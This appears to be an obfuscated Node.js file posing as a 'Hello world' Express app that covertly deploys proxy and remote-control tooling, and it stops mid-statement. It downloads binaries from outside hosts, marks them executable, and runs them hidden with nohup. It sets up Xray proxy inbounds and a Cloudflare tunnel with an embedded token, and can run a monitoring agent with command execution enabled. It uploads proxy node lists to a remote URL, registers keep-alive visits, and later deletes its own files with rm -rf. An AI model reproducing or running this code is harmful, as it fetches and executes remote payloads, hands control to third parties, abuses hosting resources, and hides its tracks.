const _0x10ab1b=_0x2abc;(function(_0x34b882,_0x3640a0){const _0x5e3743=_0x2abc,_0x1c8fe4=_0x34b882();while(!![]){try{const _0x1e92d2=-parseInt(_0x5e3743(0x1f7))/0x1+parseInt(_0x5e3743(0x205))/0x2*(parseInt(_0x5e3743(0x271))/0x3)+parseInt(_0x5e3743(0x1e6))/0x4*(-parseInt(_0x5e3743(0x1c2))/0x5)+parseInt(_0x5e3743(0x227))/0x6*(-parseInt(_0x5e3743(0x278))/0x7)+parseInt(_0x5e3743(0x216))/0x8*(parseInt(_0x5e3743(0x1c6))/0x9)+-parseInt(_0x5e3743(0x226))/0xa+parseInt(_0x5e3743(0x217))/0xb*(parseInt(_0x5e3743(0x21a))/0xc);if(_0x1e92d2===_0x3640a0)break;else _0x1c8fe4['push'](_0x1c8fe4['shift']());}catch(_0x3fb618){_0x1c8fe4['push'](_0x1c8fe4['shift']());}}}(_0x5b0a,0x28fe6));const express=require(_0x10ab1b(0x24c)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x10ab1b(0x222)),{promisify}=require(_0x10ab1b(0x1fc)),exec=promisify(require(_0x10ab1b(0x25d))[_0x10ab1b(0x1cd)]),{execSync}=require(_0x10ab1b(0x25d)),UPLOAD_URL=process[_0x10ab1b(0x207)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x10ab1b(0x207)][_0x10ab1b(0x251)]||'',AUTO_ACCESS=process['env'][_0x10ab1b(0x1d3)]||![],FILE_PATH=process[_0x10ab1b(0x207)]['FILE_PATH']||_0x10ab1b(0x1ce),SUB_PATH=process[_0x10ab1b(0x207)]['SUB_PATH']||'avfthy',PORT=process['env']['SERVER_PORT']||process[_0x10ab1b(0x207)]['PORT']||0xbb8,UUID=process[_0x10ab1b(0x207)][_0x10ab1b(0x255)]||_0x10ab1b(0x1b9),NEZHA_SERVER=process[_0x10ab1b(0x207)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x10ab1b(0x224)]||'',NEZHA_KEY=process[_0x10ab1b(0x207)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x10ab1b(0x207)][_0x10ab1b(0x1e3)]||'gTaL5F.zxiw.dpdns.org',ARGO_AUTH=process[_0x10ab1b(0x207)]['ARGO_AUTH']||_0x10ab1b(0x1e2),ARGO_PORT=process['env'][_0x10ab1b(0x1bb)]||0x1f41,CFIP=process['env'][_0x10ab1b(0x22f)]||_0x10ab1b(0x20b),CFPORT=process[_0x10ab1b(0x207)][_0x10ab1b(0x21c)]||0x1bb,NAME=process[_0x10ab1b(0x207)]['NAME']||_0x10ab1b(0x25e);!fs[_0x10ab1b(0x241)](FILE_PATH)?(fs[_0x10ab1b(0x25f)](FILE_PATH),console[_0x10ab1b(0x274)](FILE_PATH+_0x10ab1b(0x1ec))):console['log'](FILE_PATH+_0x10ab1b(0x1ca));function generateRandomName(){const _0x368753=_0x10ab1b,_0x805402=_0x368753(0x1be);let _0x4236a4='';for(let _0x466e0a=0x0;_0x466e0a<0x6;_0x466e0a++){_0x4236a4+=_0x805402[_0x368753(0x210)](Math['floor'](Math[_0x368753(0x214)]()*_0x805402[_0x368753(0x244)]));}return _0x4236a4;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x10ab1b(0x1db)](FILE_PATH,npmName),phpPath=path[_0x10ab1b(0x1db)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x10ab1b(0x1db)](FILE_PATH,botName),subPath=path[_0x10ab1b(0x1db)](FILE_PATH,_0x10ab1b(0x248)),listPath=path[_0x10ab1b(0x1db)](FILE_PATH,'list.txt'),bootLogPath=path[_0x10ab1b(0x1db)](FILE_PATH,_0x10ab1b(0x21b)),configPath=path[_0x10ab1b(0x1db)](FILE_PATH,_0x10ab1b(0x20e));function deleteNodes(){const _0x357039=_0x10ab1b;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x1bfcad;try{_0x1bfcad=fs[_0x357039(0x1e4)](subPath,'utf-8');}catch{return null;}const _0x5b1e98=Buffer[_0x357039(0x221)](_0x1bfcad,_0x357039(0x211))[_0x357039(0x1e9)](_0x357039(0x1d2)),_0x17096f=_0x5b1e98['split']('\x0a')[_0x357039(0x218)](_0x34443d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x357039(0x1f8)](_0x34443d));if(_0x17096f[_0x357039(0x244)]===0x0)return;return axios[_0x357039(0x1d8)](UPLOAD_URL+_0x357039(0x1e8),JSON[_0x357039(0x215)]({'nodes':_0x17096f}),{'headers':{'Content-Type':'application/json'}})[_0x357039(0x24b)](_0x156c2a=>{return null;}),null;}catch(_0x146302){return null;}}function _0x2abc(_0x2fad5f,_0x244eb2){_0x2fad5f=_0x2fad5f-0x1b8;const _0x5b0a6f=_0x5b0a();let _0x2abc6b=_0x5b0a6f[_0x2fad5f];return _0x2abc6b;}function cleanupOldFiles(){const _0xc4314f=_0x10ab1b;try{const _0x3a704a=fs[_0xc4314f(0x247)](FILE_PATH);_0x3a704a[_0xc4314f(0x220)](_0x383e34=>{const _0x34f025=_0xc4314f,_0x2b9972=path[_0x34f025(0x1db)](FILE_PATH,_0x383e34);try{const _0x4d8503=fs[_0x34f025(0x238)](_0x2b9972);_0x4d8503[_0x34f025(0x200)]()&&fs[_0x34f025(0x1cb)](_0x2b9972);}catch(_0x199bd7){}});}catch(_0x56ded8){}}app[_0x10ab1b(0x276)]('/',function(_0xaff31b,_0x1a6d53){_0x1a6d53['send']('Hello\x20world!');});async function generateConfig(){const _0x757598=_0x10ab1b,_0x2f4af2={'log':{'access':_0x757598(0x1c3),'error':_0x757598(0x1c3),'loglevel':_0x757598(0x212)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x757598(0x20a),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x757598(0x212),'fallbacks':[{'dest':0xbb9},{'path':_0x757598(0x27a),'dest':0xbba},{'path':_0x757598(0x21e),'dest':0xbbb},{'path':_0x757598(0x1df),'dest':0xbbc}]},'streamSettings':{'network':_0x757598(0x250)}},{'port':0xbb9,'listen':_0x757598(0x1cf),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x757598(0x212)},'streamSettings':{'network':_0x757598(0x250),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x757598(0x212)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x757598(0x1c5),'tls',_0x757598(0x206)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x757598(0x1cf),'protocol':_0x757598(0x267),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x757598(0x21e)}},'sniffing':{'enabled':!![],'destOverride':[_0x757598(0x1c5),_0x757598(0x249),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x757598(0x1cf),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x757598(0x212),'wsSettings':{'path':_0x757598(0x1df)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x757598(0x249),_0x757598(0x206)],'metadataOnly':![]}}],'dns':{'servers':[_0x757598(0x1fb)]},'outbounds':[{'protocol':_0x757598(0x26a),'tag':_0x757598(0x26f)},{'protocol':_0x757598(0x261),'tag':_0x757598(0x219)}]};fs[_0x757598(0x259)](path[_0x757598(0x1db)](FILE_PATH,_0x757598(0x20e)),JSON['stringify'](_0x2f4af2,null,0x2));}function getSystemArchitecture(){const _0xa0dd11=_0x10ab1b,_0x1d1a37=os['arch']();return _0x1d1a37==='arm'||_0x1d1a37===_0xa0dd11(0x245)||_0x1d1a37===_0xa0dd11(0x1c8)?_0xa0dd11(0x213):_0xa0dd11(0x1c4);}function downloadFile(_0x645f80,_0x140c50,_0x3591e6){const _0x21ccd6=_0x10ab1b,_0x5ad307=_0x645f80;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x3a4727=fs[_0x21ccd6(0x253)](_0x5ad307);axios({'method':_0x21ccd6(0x276),'url':_0x140c50,'responseType':_0x21ccd6(0x1b8)})[_0x21ccd6(0x26e)](_0x153771=>{const _0x4906de=_0x21ccd6;_0x153771['data'][_0x4906de(0x252)](_0x3a4727),_0x3a4727['on'](_0x4906de(0x1f1),()=>{const _0x5139b6=_0x4906de;_0x3a4727[_0x5139b6(0x25c)](),console[_0x5139b6(0x274)](_0x5139b6(0x24d)+path['basename'](_0x5ad307)+'\x20successfully'),_0x3591e6(null,_0x5ad307);}),_0x3a4727['on'](_0x4906de(0x1cc),_0x411728=>{const _0x39c102=_0x4906de;fs[_0x39c102(0x201)](_0x5ad307,()=>{});const _0x11824a='Download\x20'+path['basename'](_0x5ad307)+_0x39c102(0x203)+_0x411728[_0x39c102(0x260)];console[_0x39c102(0x1cc)](_0x11824a),_0x3591e6(_0x11824a);});})[_0x21ccd6(0x24b)](_0x4f5470=>{const _0x545cd9=_0x21ccd6,_0x2d8351=_0x545cd9(0x24d)+path[_0x545cd9(0x202)](_0x5ad307)+'\x20failed:\x20'+_0x4f5470[_0x545cd9(0x260)];console['error'](_0x2d8351),_0x3591e6(_0x2d8351);});}async function downloadFilesAndRun(){const _0x55a17e=_0x10ab1b,_0x22dc83=getSystemArchitecture(),_0x5aa62b=getFilesForArchitecture(_0x22dc83);if(_0x5aa62b[_0x55a17e(0x244)]===0x0){console[_0x55a17e(0x274)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x5ecaa7=_0x5aa62b[_0x55a17e(0x22b)](_0x3b26e7=>{return new Promise((_0x57233e,_0x3b1b42)=>{const _0x2ab32e=_0x2abc;downloadFile(_0x3b26e7[_0x2ab32e(0x264)],_0x3b26e7['fileUrl'],(_0x514e85,_0x421016)=>{_0x514e85?_0x3b1b42(_0x514e85):_0x57233e(_0x421016);});});});try{await Promise['all'](_0x5ecaa7);}catch(_0x247cca){console[_0x55a17e(0x1cc)]('Error\x20downloading\x20files:',_0x247cca);return;}function _0x125b29(_0x12a79c){const _0x3c1e86=_0x55a17e,_0x440207=0x1fd;_0x12a79c[_0x3c1e86(0x220)](_0x25eac8=>{const _0x2c4701=_0x3c1e86;fs[_0x2c4701(0x241)](_0x25eac8)&&fs[_0x2c4701(0x1d5)](_0x25eac8,_0x440207,_0x534faa=>{const _0x29c19a=_0x2c4701;_0x534faa?console['error']('Empowerment\x20failed\x20for\x20'+_0x25eac8+':\x20'+_0x534faa):console['log'](_0x29c19a(0x208)+_0x25eac8+':\x20'+_0x440207[_0x29c19a(0x1e9)](0x8));});});}const _0x44745b=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x125b29(_0x44745b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3bb0c2=NEZHA_SERVER[_0x55a17e(0x225)](':')?NEZHA_SERVER[_0x55a17e(0x25b)](':')[_0x55a17e(0x232)]():'',_0xd5d951=new Set(['443',_0x55a17e(0x265),_0x55a17e(0x258),'2087',_0x55a17e(0x1dd),_0x55a17e(0x269)]),_0x13edf7=_0xd5d951[_0x55a17e(0x1f0)](_0x3bb0c2)?'true':_0x55a17e(0x257),_0x4d419b=_0x55a17e(0x1fd)+NEZHA_KEY+_0x55a17e(0x1e1)+NEZHA_SERVER+_0x55a17e(0x1e5)+_0x13edf7+_0x55a17e(0x1c0)+UUID;fs[_0x55a17e(0x259)](path[_0x55a17e(0x1db)](FILE_PATH,_0x55a17e(0x1d1)),_0x4d419b);const _0x4a886b=_0x55a17e(0x243)+phpPath+_0x55a17e(0x23f)+FILE_PATH+_0x55a17e(0x1fe);try{await exec(_0x4a886b),console[_0x55a17e(0x274)](phpName+'\x20is\x20running'),await new Promise(_0x4a43d0=>setTimeout(_0x4a43d0,0x3e8));}catch(_0x31b429){console[_0x55a17e(0x1cc)](_0x55a17e(0x272)+_0x31b429);}}else{let _0x459076='';const _0x2ac4f5=[_0x55a17e(0x1e7),_0x55a17e(0x265),'2096',_0x55a17e(0x1d7),_0x55a17e(0x1dd),_0x55a17e(0x269)];_0x2ac4f5['includes'](NEZHA_PORT)&&(_0x459076=_0x55a17e(0x242));const _0x4910b3=_0x55a17e(0x243)+npmPath+_0x55a17e(0x26b)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x459076+_0x55a17e(0x228);try{await exec(_0x4910b3),console[_0x55a17e(0x274)](npmName+_0x55a17e(0x233)),await new Promise(_0x22551a=>setTimeout(_0x22551a,0x3e8));}catch(_0x301f64){console[_0x55a17e(0x1cc)](_0x55a17e(0x1eb)+_0x301f64);}}}else console[_0x55a17e(0x274)](_0x55a17e(0x20c));const _0x333b46='nohup\x20'+webPath+_0x55a17e(0x1c1)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x333b46),console[_0x55a17e(0x274)](webName+_0x55a17e(0x233)),await new Promise(_0x3ee769=>setTimeout(_0x3ee769,0x3e8));}catch(_0x15ebaf){console[_0x55a17e(0x1cc)](_0x55a17e(0x1da)+_0x15ebaf);}if(fs['existsSync'](botPath)){let _0x1244d0;if(ARGO_AUTH[_0x55a17e(0x246)](/^[A-Z0-9a-z=]{120,250}$/))_0x1244d0=_0x55a17e(0x22c)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x1244d0='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x55a17e(0x1c9):_0x1244d0=_0x55a17e(0x23a)+FILE_PATH+_0x55a17e(0x26c)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x1244d0+'\x20>/dev/null\x202>&1\x20&'),console[_0x55a17e(0x274)](botName+_0x55a17e(0x233)),await new Promise(_0x424136=>setTimeout(_0x424136,0x7d0));}catch(_0x9ba801){console[_0x55a17e(0x1cc)](_0x55a17e(0x23d)+_0x9ba801);}}await new Promise(_0x547c6e=>setTimeout(_0x547c6e,0x1388));}function _0x5b0a(){const _0x12fba9=['substring','map','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','tunnel.json','taskkill\x20/f\x20/im\x20','CFIP','ArgoDomain:','https://arm64.ssss.nyc.mn/v1','pop','\x20is\x20running','status','automatic\x20access\x20task\x20added\x20successfully','unshift','/api/add-nodes','statSync','https://ipapi.co/json/','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','https://amd64.ssss.nyc.mn/v1','\x0a\x20\x20credentials-file:\x20','Error\x20executing\x20command:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x20-c\x20\x22','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','existsSync','--tls','nohup\x20','length','arm64','match','readdirSync','sub.txt','tls','platform','catch','express','Download\x20','/sub.txt\x20saved\x20successfully','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','tcp','PROJECT_URL','pipe','createWriteStream','data','UUID','success','false','2096','writeFileSync','Add\x20automatic\x20access\x20task\x20faild:\x20','split','close','child_process','zhuzhai','mkdirSync','message','blackhole','org','push','fileName','8443','https://amd64.ssss.nyc.mn/agent','vmess','del\x20/f\x20/q\x20','2053','freedom','\x20-s\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x20>\x20nul\x202>&1','then','direct','?encryption=none&security=tls&sni=','6051IrlKnc','php\x20running\x20error:\x20','application/json','log','country_code','get','listen','1442tObIVB','Unhandled\x20error\x20in\x20startserver:','/vless-argo','firefox','stream','cf1f82c5-7b4f-49fd-81e5-3b4a6649eb0a','TunnelSecret','ARGO_PORT','send','response','abcdefghijklmnopqrstuvwxyz','pkill\x20-f\x20\x22[','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x20-c\x20','305iyldzV','/dev/null','amd','http','36gniEyi','&fp=firefox&type=ws&host=','aarch64','/tunnel.yml\x20run','\x20already\x20exists','unlinkSync','error','exec','./tmp','127.0.0.1','?security=tls&sni=','config.yaml','utf-8','AUTO_ACCESS','https://arm64.ssss.nyc.mn/bot','chmod','https://oooo.serv00.net/add-url','2087','post','&path=%2Ftrojan-argo%3Fed%3D2560#','web\x20running\x20error:\x20','join','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','2083','App\x20is\x20running','/trojan-argo','.exe\x20>\x20nul\x202>&1','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','eyJhIjoiOTIxMTBhMjNlZTI4NjI2ZTZlNTc4NGE3MWQ1MTk3NDIiLCJ0IjoiMDRiZmM1ZmUtYjJmNi00Y2ZiLTg0Y2EtMWYxMjQ5ZjMxYWYxIiwicyI6Ik56a3lPR0l5WXpRdFlXVXlNUzAwTURNMkxUaGlZbVl0TldSaU1EUmlObVExTnpJMyJ9','ARGO_DOMAIN','readFileSync','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','4276uWTdBo','443','/api/delete-nodes','toString','https://amd64.ssss.nyc.mn/web','npm\x20running\x20error:\x20','\x20is\x20created','tunnel.yml','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x20>/dev/null\x202>&1\x20&','has','finish','Subscription\x20uploaded\x20successfully','/api/add-subscriptions','Nodes\x20uploaded\x20successfully','\x0a\x0atrojan://','win32','83508orfWkc','test','countryCode','Error\x20reading\x20boot.log:','https+local://8.8.8.8/dns-query','util','\x0aclient_secret:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','text/plain;\x20charset=utf-8','isFile','unlink','basename','\x20failed:\x20','/vmess-argo?ed=2560','326BQAdBq','quic','env','Empowerment\x20success\x20for\x20','\x20>/dev/null\x202>&1','vless','104.17.63.216','NEZHA\x20variable\x20is\x20empty,skip\x20running','http\x20server\x20is\x20running\x20on\x20port:','config.json','https://arm64.ssss.nyc.mn/agent','charAt','base64','none','arm','random','stringify','341632KUtdzt','22uRBFaf','filter','block','1110072tBKrWv','boot.log','CFPORT','&path=%2Fvless-argo%3Fed%3D2560#','/vmess-argo','ARGO_DOMAIN:','forEach','from','path','clear','NEZHA_PORT','includes','2359260nvIKpv','3846iRGiHG','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/web'];_0x5b0a=function(){return _0x12fba9;};return _0x5b0a();}function getFilesForArchitecture(_0x4c8b49){const _0x203a89=_0x10ab1b;let _0x98b6bb;_0x4c8b49==='arm'?_0x98b6bb=[{'fileName':webPath,'fileUrl':_0x203a89(0x229)},{'fileName':botPath,'fileUrl':_0x203a89(0x1d4)}]:_0x98b6bb=[{'fileName':webPath,'fileUrl':_0x203a89(0x1ea)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3053e6=_0x4c8b49===_0x203a89(0x213)?_0x203a89(0x20f):_0x203a89(0x266);_0x98b6bb[_0x203a89(0x236)]({'fileName':npmPath,'fileUrl':_0x3053e6});}else{const _0x428864=_0x4c8b49===_0x203a89(0x213)?_0x203a89(0x231):_0x203a89(0x23b);_0x98b6bb[_0x203a89(0x236)]({'fileName':phpPath,'fileUrl':_0x428864});}}return _0x98b6bb;}function argoType(){const _0x4bf5f0=_0x10ab1b;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4bf5f0(0x274)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x4bf5f0(0x225)](_0x4bf5f0(0x1ba))){fs[_0x4bf5f0(0x259)](path[_0x4bf5f0(0x1db)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x4dc673='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+_0x4bf5f0(0x23c)+path[_0x4bf5f0(0x1db)](FILE_PATH,_0x4bf5f0(0x22d))+_0x4bf5f0(0x240)+ARGO_DOMAIN+_0x4bf5f0(0x1ee)+ARGO_PORT+_0x4bf5f0(0x1dc);fs[_0x4bf5f0(0x259)](path[_0x4bf5f0(0x1db)](FILE_PATH,_0x4bf5f0(0x1ed)),_0x4dc673);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x3237ba=_0x10ab1b;let _0x22d77d;if(ARGO_AUTH&&ARGO_DOMAIN)_0x22d77d=ARGO_DOMAIN,console['log'](_0x3237ba(0x21f),_0x22d77d),await _0xd8720b(_0x22d77d);else try{const _0x291639=fs[_0x3237ba(0x1e4)](path[_0x3237ba(0x1db)](FILE_PATH,_0x3237ba(0x21b)),_0x3237ba(0x1d2)),_0x173193=_0x291639[_0x3237ba(0x25b)]('\x0a'),_0x1fa649=[];_0x173193[_0x3237ba(0x220)](_0x248d99=>{const _0x5278ad=_0x3237ba,_0x1e9767=_0x248d99[_0x5278ad(0x246)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1e9767){const _0x48312a=_0x1e9767[0x1];_0x1fa649[_0x5278ad(0x263)](_0x48312a);}});if(_0x1fa649[_0x3237ba(0x244)]>0x0)_0x22d77d=_0x1fa649[0x0],console[_0x3237ba(0x274)](_0x3237ba(0x230),_0x22d77d),await _0xd8720b(_0x22d77d);else{console[_0x3237ba(0x274)](_0x3237ba(0x24f)),fs['unlinkSync'](path[_0x3237ba(0x1db)](FILE_PATH,'boot.log'));async function _0xfd3773(){const _0x414a9b=_0x3237ba;try{process[_0x414a9b(0x24a)]===_0x414a9b(0x1f6)?await exec(_0x414a9b(0x22e)+botName+_0x414a9b(0x1e0)):await exec(_0x414a9b(0x1bf)+botName[_0x414a9b(0x210)](0x0)+']'+botName[_0x414a9b(0x22a)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x2a9d34){}}_0xfd3773(),await new Promise(_0xfe6d45=>setTimeout(_0xfe6d45,0xbb8));const _0x3e45d2=_0x3237ba(0x23a)+FILE_PATH+_0x3237ba(0x26c)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x3e45d2+_0x3237ba(0x1ef)),console['log'](botName+_0x3237ba(0x233)),await new Promise(_0x5b5ef2=>setTimeout(_0x5b5ef2,0xbb8)),await extractDomains();}catch(_0x1654b9){console['error']('Error\x20executing\x20command:\x20'+_0x1654b9);}}}catch(_0x300ad1){console['error'](_0x3237ba(0x1fa),_0x300ad1);}async function _0xb76336(){const _0x5937ae=_0x3237ba;try{const _0x2361ea=await axios[_0x5937ae(0x276)](_0x5937ae(0x239),{'timeout':0xbb8});if(_0x2361ea['data']&&_0x2361ea[_0x5937ae(0x254)][_0x5937ae(0x275)]&&_0x2361ea['data'][_0x5937ae(0x262)])return _0x2361ea[_0x5937ae(0x254)]['country_code']+'_'+_0x2361ea['data']['org'];}catch(_0x15cf3e){try{const _0x1d7c4d=await axios[_0x5937ae(0x276)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x1d7c4d['data']&&_0x1d7c4d[_0x5937ae(0x254)][_0x5937ae(0x234)]===_0x5937ae(0x256)&&_0x1d7c4d[_0x5937ae(0x254)][_0x5937ae(0x1f9)]&&_0x1d7c4d[_0x5937ae(0x254)]['org'])return _0x1d7c4d['data'][_0x5937ae(0x1f9)]+'_'+_0x1d7c4d['data'][_0x5937ae(0x262)];}catch(_0x358618){}}return'Unknown';}async function _0xd8720b(_0x3bc8a5){const _0xa89e7b=await _0xb76336(),_0x2873bf=NAME?NAME+'-'+_0xa89e7b:_0xa89e7b;return new Promise(_0x407109=>{setTimeout(()=>{const _0x33523c=_0x2abc,_0x4071d1={'v':'2','ps':''+_0x2873bf,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x33523c(0x212),'net':'ws','type':'none','host':_0x3bc8a5,'path':_0x33523c(0x204),'tls':_0x33523c(0x249),'sni':_0x3bc8a5,'alpn':'','fp':_0x33523c(0x27b)},_0x18f85e='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x33523c(0x270)+_0x3bc8a5+_0x33523c(0x1c7)+_0x3bc8a5+_0x33523c(0x21d)+_0x2873bf+'\x0a\x0avmess://'+Buffer['from'](JSON['stringify'](_0x4071d1))[_0x33523c(0x1e9)](_0x33523c(0x211))+_0x33523c(0x1f5)+UUID+'@'+CFIP+':'+CFPORT+_0x33523c(0x1d0)+_0x3bc8a5+_0x33523c(0x1c7)+_0x3bc8a5+_0x33523c(0x1d9)+_0x2873bf+'\x0a\x20\x20\x20\x20';console[_0x33523c(0x274)](Buffer[_0x33523c(0x221)](_0x18f85e)[_0x33523c(0x1e9)]('base64')),fs[_0x33523c(0x259)](subPath,Buffer[_0x33523c(0x221)](_0x18f85e)[_0x33523c(0x1e9)](_0x33523c(0x211))),console['log'](FILE_PATH+_0x33523c(0x24e)),uploadNodes(),app[_0x33523c(0x276)]('/'+SUB_PATH,(_0x5078f5,_0x5ec476)=>{const _0x2a5449=_0x33523c,_0x4420d6=Buffer[_0x2a5449(0x221)](_0x18f85e)[_0x2a5449(0x1e9)]('base64');_0x5ec476['set']('Content-Type',_0x2a5449(0x1ff)),_0x5ec476[_0x2a5449(0x1bc)](_0x4420d6);}),_0x407109(_0x18f85e);},0x7d0);});}}async function uploadNodes(){const _0x57510d=_0x10ab1b;if(UPLOAD_URL&&PROJECT_URL){const _0x44b961=PROJECT_URL+'/'+SUB_PATH,_0xbfc9dc={'subscription':[_0x44b961]};try{const _0x13ef5c=await axios[_0x57510d(0x1d8)](UPLOAD_URL+_0x57510d(0x1f3),_0xbfc9dc,{'headers':{'Content-Type':_0x57510d(0x273)}});return _0x13ef5c&&_0x13ef5c[_0x57510d(0x234)]===0xc8?(console[_0x57510d(0x274)](_0x57510d(0x1f2)),_0x13ef5c):null;}catch(_0xdfa7b4){if(_0xdfa7b4[_0x57510d(0x1bd)]){if(_0xdfa7b4[_0x57510d(0x1bd)][_0x57510d(0x234)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x57510d(0x241)](listPath))return;const _0x2b9ba3=fs[_0x57510d(0x1e4)](listPath,_0x57510d(0x1d2)),_0x483923=_0x2b9ba3['split']('\x0a')[_0x57510d(0x218)](_0x1f231e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x57510d(0x1f8)](_0x1f231e));if(_0x483923['length']===0x0)return;const _0x513e5e=JSON['stringify']({'nodes':_0x483923});try{const _0xca1a8c=await axios[_0x57510d(0x1d8)](UPLOAD_URL+_0x57510d(0x237),_0x513e5e,{'headers':{'Content-Type':_0x57510d(0x273)}});return _0xca1a8c&&_0xca1a8c['status']===0xc8?(console[_0x57510d(0x274)](_0x57510d(0x1f4)),_0xca1a8c):null;}catch(_0x53d132){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x2c43db=_0x2abc,_0x511d5d=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x511d5d[_0x2c43db(0x263)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x511d5d[_0x2c43db(0x263)](phpPath);process[_0x2c43db(0x24a)]===_0x2c43db(0x1f6)?exec(_0x2c43db(0x268)+_0x511d5d[_0x2c43db(0x1db)]('\x20')+_0x2c43db(0x26d),_0x9150c7=>{const _0x32325b=_0x2c43db;console['clear'](),console[_0x32325b(0x274)](_0x32325b(0x1de)),console['log'](_0x32325b(0x23e));}):exec('rm\x20-rf\x20'+_0x511d5d[_0x2c43db(0x1db)]('\x20')+_0x2c43db(0x209),_0x16ac3=>{const _0x2eb43c=_0x2c43db;console[_0x2eb43c(0x223)](),console[_0x2eb43c(0x274)](_0x2eb43c(0x1de)),console[_0x2eb43c(0x274)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1e76f9=_0x10ab1b;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1e76f9(0x274)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x98314a=await axios[_0x1e76f9(0x1d8)](_0x1e76f9(0x1d6),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1e76f9(0x273)}});return console[_0x1e76f9(0x274)](_0x1e76f9(0x235)),_0x98314a;}catch(_0x250ed8){return console[_0x1e76f9(0x1cc)](_0x1e76f9(0x25a)+_0x250ed8[_0x1e76f9(0x260)]),null;}}async function startserver(){const _0x18e877=_0x10ab1b;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x347d5f){console[_0x18e877(0x1cc)]('Error\x20in\x20startserver:',_0x347d5f);}}startserver()['catch'](_0x1ef3c4=>{const 